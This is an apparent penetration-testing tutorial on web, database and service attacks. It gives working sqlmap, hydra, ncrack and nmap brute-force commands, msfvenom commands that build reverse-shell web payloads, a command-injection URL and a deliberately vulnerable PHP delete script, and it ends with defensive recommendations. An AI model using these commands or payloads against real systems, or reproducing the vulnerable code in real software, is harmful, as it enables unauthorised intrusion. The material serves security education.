# Exploitation

An exploit (from the English verb to exploit, meaning "to use something to one’s own advantage") is a piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability to cause unintended or unanticipated behavior to occur on computer software, hardware, or something electronic (usually computerized). Such behavior frequently includes things like gaining control of a computer system, allowing privilege escalation, or a denial-of-service (DoS or related DDoS) attack.

Here is some examples of security tools:

* __Exploit Frameworks__: Metasploit, Core Impact, Cobalt Strike, etc. These tools already have some previously discovered exploits and common features, such as shell listeners, local privilege escalation scripts, hard-coded password controls, etc.
* __Attack Proxies__: Burp Suite, OWASP ZAP, etc. They give us chance to manipulate HTTP header parameters. Attacks can setup a proxy to intercept HTTP calls and interact with parameters.
* __Vulnerability scanners__: Netsparker, Acunetix, Nikto, etc. can automatically detect security and configuration issues.


## Web / API Attacks
Web / API attacks are related with HTTP service. Attackers try to inject malicious commands, detect applications versions and discover useful contents such as left-over, backup and configuration files, etc.

OWASP is a great source for application security and they made a TOP 10 list to emphasize most common  attacks. [The OWASP Top 10](https://owasp.org/www-project-top-ten/) is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.

Some common attacks and explanations:

* __Directory Brute Force__ may reveal hidden content of the web service: default pages, application versions and backend files which are not intended to expose end users, etc. 

	dirb, dirbuster, gobuster, wfuzz, etc. tools can be used.

	Example code:
	```
	$ dirb http://URL/ PossibleFilesList.txt
	$ wfuzz -c file,PossibleFilesList.txt --hc 404 http://URL/FUZZ
	```

	The important part is in here:
    * These tools do not spider the target system and only check for files/folders in the parameter we provided (PossibleFilesList.txt). 
    * We still need to handle session cookies and tokens. Otherwise, the test will be performed over unauthenticated session, but it is still acceptable, because HTTP 403 may indicate the requested URL exists.
    * And we need to analysis out-come of the scan result and know common HTTP responses and the target system behavior:
        - __HTTP 200__: The file is accessible. (Successful response)
        - __HTTP 302__: The request may be redirected to login page. (Redirection messages)
        - __HTTP 403__: The page is not accessible due to lack of permission or authorization. (Content Forbidden)
        - __HTTP 404__: The file does not exist. (Content Not Found)
    
    These codes are common HTTP responses, but some web pages act in a different way. For example, if the requested URL does not exist, the service may reply with a 'HTTP 200' code and indicates the result with a notification text, instead of responding with a 'HTTP 404' code.
    
    Default pages, backup files and application versions can be very useful: 
    * Default pages may lead us to login pages, reveals common configurations and guessable user credentials.
    * Backup files may contain application credentials and other details. Attacker can restore it and see what is going on the application's backend.
    * Also application versions are important, because attackers can search for publicly known vulnerabilities. [Github](https://github.com), [Exploit-DB](https://www.exploit-db.com) and search engines are great sources for CVE records. Additionally, attackers can download same versions of the applications and simulate the target environment to find zero days. 

* A __SQL Injection Attack__ consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

  Some common SQLi control payloads:

  ```
  sql> select username,title,salary from UsersTable where userID = {id};
  
  http://URL?id=1337 or 1=1  -- 	//should always return True
  http://URL?id=1337 and 1=2 -- 	//should always return False
  ```

  Also 'sqlmap' can be very useful and time saver:

  ```
  $ sqlmap -u 'http://URL/?id=1337' -p 'id' --dbs --tables --columns
  ```
  If the 'id' param is vulnerable for SQLi attacks, 'sqlmap' performs various payloads to retrieve database tables, columns, contents, etc.
  

* __Command Injection__ is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

	It is a very serious attack vector because attacker can interact with target operating system directly and run arbitrary commands.
	
	There are a couple different ways to perform it:
	
    * __Uploading malicious files__: Attackers can upload malicious executable files to target system and call them over URL path.

		To create a backdoor, we can use Metasploit framework. Here is an example for 3 different web payloads:
	```
	$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx >reverse.aspx
	$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
	$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw> reverse.jsp
	```

	After uploading the files we create, we should set-up a local listener (meterpreter, ncat) for command prompt interaction.

	Please also note that, these files are executables and the target system may not accept them directly. So attackers can play with file extensions and HTTP content type to bypass restrictions.
	
    * __Modifying target system files__: Web service template files can be a good target. Attacker may modify email template, error pages, etc. and add malicious contents.
    * __Injecting commands__: Some application may require to run OS commands and it raises many concerns. The example below, the web page takes 'filename' parameter and remove the argument file from operating system. However, shell escape chars like '&, |, ;' may lead to execute '__$ rm tmp.txt;id__' commands all together. That means, the client can execute more commands than she/he is supposed to.
		```
		Http Call:
		  http://URL/removeFile.php?filename=tmp.txt;id
					
		removeFile.php content:
		<?php
		  print("Please specify the name of the file to delete");
		  print("<p>");
		  $file=$_GET['filename'];
		  system("rm $file");
		?>
		```

  All these commands will be run with the target service's privilege and that shows again the service accounts should run with minimum privileges to reduce attack surfaces.


## Database Services
Database services play an important role for applications and they should be isolated from user accessible networks. Otherwise, they will become an open target for attackers and it may lead to serious consequence. 

Some common database systems are MySQL, PostgreSQL, MSSql, Oracle, etc. 

Beside SQLi attacks, intruders can also target the database application itself:

* Attackers can try login attempts, if the service host:port is accessible. Default and guessable credentials will be first thing to try. 
	Some example of brute force commands:

	```
	$ ncrack -v -iL TargetIPAddresses.txt --user root -P passwords.txt -p PostgreSQL CL=1
	$ hydra -L userNames.txt -P userPass.txt <IP> mssql
	$ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL <IP>
	$ nmap -p 27017 <IP> --script mongodb-brute
	```

* Application banners can be helpful to obtain running versions numbers and attackers can search for reported vulnerabilities. Even they can download and simulate the target environment to find zero days. 

	```
	$ nmap -sV --script=banner <IP>
	```
	In action:
	```
	$ nmap -sV --script=banner  localhost -p80
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 09:09 CEST
	Nmap scan report for localhost (127.0.0.1)
	Host is up (0.00014s latency).

	PORT   STATE SERVICE VERSION
	80/tcp open  http    SimpleHTTPServer 0.6 (Python 3.9.9)
	|_http-server-header: SimpleHTTP/0.6 Python/3.9.9
	...

	```

* And insecure algorithms or protocols may also cause traffic monitoring, data manipulation, replay attacks, etc. Best practices should be followed for __data-at-rest, data-in-transit__ and __data-in-use__.
    * SSLv3, MD5, TLSv1.0, TLSv1.1, DES, RC4, SHA1, ECB are some example of weak algorithms and protocols.
    * 'Key Management Lifecycle' should be part of all encryption/decryption steps.
    * Application layer encryptions can be an option but it also raises some security concerns:
        - How to handle Encryption Key
        - How to mitigate replay attacks
        - And it may lack of digital signature and host identification.
	
	For most of cases, using TLS is a better option.

## Other Application Services
Other Application Services also help attackers to gain access. Vulnerable versions, missing configuration or insecure protocols are still important. If the service is exposed to the network, it can be discovered with network scanning tools, such as NMAP. It may give attackers chance to understand the target system better and even help for further exploitation. 

Version vulnerabilities and brute-force attacks are also applicable as well. Some common application services and attacks:

* FTP can be used for file transfer, however it communicates over a plain text protocol. Attackers can poison the client's network to monitor her/his traffic. Default and guessable accounts also give attackers chance to access target system and perform transfer files. 
	
	The service detection command:
	```
	$ nmap -sV -sC <IP>
	```

* SMTP is a mail transfer protocol and it can be a good target for password reset or employee impersonation. Also 'open relay' feature may allow anyone to send emails without providing credentials. 
	
	The service detection command:
	```
	$ nmap -sTV -p 25,465,587 <IP>
	$ nmap --script smtp-open-relay.nse [--script-args smtp-open-relay.domain=<domain>,smtp-open-relay.ip=<address>,...] -p 25,465,587 <IP>
	$ nmap --script smtp-enum-users.nse [--script-args smtp-enum-users.methods={EXPN,...},...] -p 25,465,587 <IP>
	```
  
* Network Shares give users to access common paths and weak access permissions may expose critical contents to intruders. Network shares and file permissions should always have a proper access roles. 

	The service detection command:
	```
	$ nmap --script smb-enum-shares.nse -p445 <IP>
	$ sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <IP>
	```

* Login brute force and banner grabbing (for version detection) are also applicable for all service types as well.

	Example ssh brute-force command:
	```
	$ nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s <IP>
	```
	In action:
	```	
	$ nmap -p 22 --script ssh-brute localhost
	...
	NSE: [ssh-brute] Trying username/password pair: root:root
	NSE: [ssh-brute] Trying username/password pair: admin:123456
	NSE: [ssh-brute] Trying username/password pair: administrator:Password
	Nmap scan report for localhost (127.0.0.1)
	Host is up (0.00019s latency).

	PORT   STATE SERVICE
	22/tcp open  ssh
	| ssh-brute: 
	|   Accounts: 1 valid accounts found
	|_  Statistics: Performed 3183 guesses in 604 seconds, average tps: 5.0

	Nmap done: 1 IP address (1 host up) scanned in 604.82 seconds
	```

	Another alternative for grabbing service header/banner:
	```
	$ nc -vv <IP> <PORT>

	nc -vv localhost 22
	Connection to localhost port 22 [tcp/ssh] succeeded!
	SSH-2.0-OpenSSH_9.1
	...
	
	```

## User and Account Management
User management is also another important part of secure design. All users should have minimum roles, a proper passwords policy and all service accounts should have least privileges. 

Some common example of bad practices: 

* Running services with administrative accounts, for example running database or web service with admin privilege. Any code injection will double the damage if the service runs with a high privilege account. Security best practices recommend to use minimum roles with a restricted environment. 
* Using same accounts/credentials for other services is also not part of security best practices. For example, using same password for database and operating system increase the attack surface. That means, somehow if attacker find a way to obtain the credentials, then she/he will be able to login both systems.
* Using default/guessable credentials are another security bad practice example. Each account should be unique, have a proper password policy and management cycle. 

## Brute Force Attack
Brute force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found. It is a very time consuming method and trying all possible combinations may take a very long time. So attackers may generate a little bit smart dictionary list to try, for example: years (2020, 2021, 2022), months (May, June, July), default passwords, location and company related information, etc.

Some common testing tools:
* Burp Suite and Zap Proxy can be used for credential and directory brute forcing. They only supports HTTP protocol and do not work for others.
* hydra, nmap, ncrack, medusa, etc. are some example of online brute-forcing tools. They support various of network protocols and do quite similar jobs.
* john the ripper, hashcat, etc. are some example of offline brute-forcing tools. We can use them to crack hashes, passwords, etc.

And the target system should restrict user attempts with implementing:

* A proper password policy: complex password (upper case, lower case, special characters and numbers) with enough length
* Lockout policy: lock user accounts temporary or permanently, if suspicious attempts happen.
* Captcha: It might be a good option to prevent bulk requests in a short amount of time, but it should be complex enough to not solve easily.
* Limiting request numbers: ban requests or give delayed responses.
* Monitor suspicious activities: monitor user accounts and activates to detect intrusive behaviors. 
* Two-factor authentication: Users should approve her/his own requests through a separate communication channel. This out-of-band authentication approval method can be something you know, something you have, and something you are.
